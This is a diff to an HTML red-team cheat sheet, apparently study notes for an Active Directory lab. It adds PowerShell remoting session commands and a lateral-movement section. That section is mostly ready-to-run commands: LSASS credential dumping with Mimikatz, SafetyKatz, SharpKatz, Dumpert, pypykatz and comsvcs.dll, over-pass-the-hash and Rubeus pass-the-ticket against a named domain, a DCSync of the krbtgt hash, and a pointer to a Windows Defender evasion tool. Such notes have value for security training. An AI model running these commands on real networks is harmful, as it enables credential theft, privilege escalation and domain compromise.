@@ -526,6 +526,11 @@ powershell remoting
 
 ONE-TO-ONE | ONE-TO-MANY
 
+<b>::: store a session in a variable</b>
+
+PS> $[variable_name] = New-PSSession -ComputerName [hostname]
+PS> $b0ydC = New-PSSession -ComputerName ofsv-001
+
 <b>::: one to one</b>
 
 PSSession
@@ -561,6 +566,82 @@ PS> Invoke-Command -ScriptBlock${function:Get-PassHashes} -ComputerName(Get-Cont
 <b>::: execute "Stateful" commands using Invoke-Command</b>
 
 PS> $Sess = New-PSSession –Computername <hostname> Invoke-Command –Session $Sess –ScriptBlock{$Proc=Get-Process} Invoke-Command –Session $Sess –ScriptBlock{$Proc.Name}
+
+<b>-LATERAL MOVEMENT : MIMIKATZ | EXTRACTING CREDENTIALS FROM LSASS-</b>
+
+<b>::: dump credentials on a local machine using mimikatz </b>
+
+PS> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+
+<b>::: using safetykatz (minidump of lsass and PELoader to run mimikatz)</b>
+
+PS> SafetyKatz.exe "sekurlsa::ekeys"
+
+<b>::: dump credentials using sharpkatz (C# port of some of mimikatz functionality)</b>
+
+PS> SharpKatz.exe --Command ekeys
+
+<b>::: dump credentials using dumpert(direct system calls and API unhooking)</b>
+
+PS> rundll32.exe C:\Dumpert\Outflank-Dumpert.dll, Dump
+
+<b>::: dump using pypykatz (mimikatz functinality in python)</b>
+
+PS> pypykatz.exe live lsa
+
+<b>::: dump using comsvcs.dll</b>
+
+PS> tasklist /FI "IMAGENAME eq lsass.exe"
+PS> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
+
+<b>-LATERAL MOVEMENT : MIMIKATZ | OVER PASS THE HASH-</b>
+
+<b>::: over pass the hash generate tokens from hashes or keys. | need elevation, run as admin </b>
+
+- mimikatz
+
+PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'
+
+- safetyKatz
+
+PS> SafetyKatz.exe"sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe""exit"
+
+<b>::: rubeus.exe Usage</b>
+
+- NO elevation required
+
+PS> rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
+
+- elevation required
+
+PS> Rubeus.exe asktgt /user:Administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+<b>-LATERAL MOVEMENT : MIMIKATZ | DCSync-</b>
+
+<b>::: use the DCSyncfeature for getting krbtgthash executed </b>
+
+both require admin privileges
+
+PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
+PS> SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+
+<b>-Offensive .NET - Tradecraft-</b>
+
+like AMSI Trigger, exist Defender Check for Windows Defender.
+
+<a href="https://github.com/matterpreter/DefenderCheck">Defender Check</a> 
+
+<b> </b>
+
+<b> </b>
+
+<b> </b>
+
+<b> </b>
+
+<b> </b>
+
+<b> </b>
 
 </center>
 </body>
